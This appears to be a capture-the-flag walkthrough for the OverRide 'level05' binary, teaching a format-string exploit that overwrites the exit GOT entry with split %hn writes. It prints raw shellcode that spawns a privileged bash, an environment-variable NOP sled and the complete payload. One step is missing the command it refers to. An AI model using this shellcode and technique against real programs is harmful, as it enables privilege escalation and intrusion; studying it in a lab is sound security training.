# Help level05

For this exercise, we need to take a deeper look at addressing with high-order
and low-order words (each 2 bytes, since we'll be using `%hn`).

But first, let's figure out how to exploit the binary.

## Finding the offset

Run the program and check where our input lands using `%p`:

./level05
aaaa %p %p %p ...

We see that our input is the **10th argument** on the stack (i.e. `%10$p`
points to it).

## Choosing the target address

gives us `0x080497e0` for `exit`, which in little-endian becomes
`\xe0\x97\x04\x08`.

## Placing the shellcode

We put the shellcode in an environment variable rather than in `argv`, to
make sure nothing alters it (for example, if the program transforms/filters
its arguments, environment variables are left untouched):
export SHELLCODE=$(python -c 'print("\x90"*1000 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")')

## Finding the shellcode's address

Using a small C program, we can get the address of the environment variable
(forget GDB here — the address can differ because of stack padding
differences between GDB and normal execution):

level05@OverRide:/tmp$ ./a.out
0xffffd4ed
Converting to decimal (e.g. with GDB's `print`):
print 0xffffd4ed
$1 = 4294956235

(From here on, this address is just an example — yours will likely differ.)

## Why a naive write fails

(python -c 'print("\xe0\x97\x04\x08" + "%4294956235%10$n")'; cat) | ./level05
This doesn't work: `printf` cannot output ~4.3 billion characters just to
pad the count up to our target value. We need a smarter approach.

## Splitting into high/low order words

Since `printf` can't handle a number that big directly, we write the address
in two 2-byte chunks using `%hn` instead of `%n`.

Our shellcode address: `0xffffd4ed`

- High-order word: `0xffff` = 65535
- Low-order word: `0xd4ed` = 54509

We already print 8 characters at the very start of the payload (the two
4-byte GOT addresses), so we need to subtract 8 from the low-order word
target: 54509 - 8 = 54501
To reach the high-order word afterward, we need the *additional* padding
between the low word and the high word: 65535 - 54509 = 11026

## Building the payload

1. `\xe0\x97\x04\x08` — address of the `exit` GOT entry (for the low word)
2. `\xe2\x97\x04\x08` — address of `exit` GOT entry + 2 (for the high word)
3. `%54501x` — padding so the total character count matches the low-order word
4. `%10$hn` — write those 2 bytes to the address at argument 10 (the low GOT address)
5. `%11026x` — additional padding to reach the high-order word
6. `%11$hn` — write those 2 bytes to the address at argument 11 (the high GOT address)

Final payload:
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54501x" + "%10$hn" + "%11026x" + "%11$hn")'; cat -) | ./level05

Congrats, we now have a shell — go grab the flag!
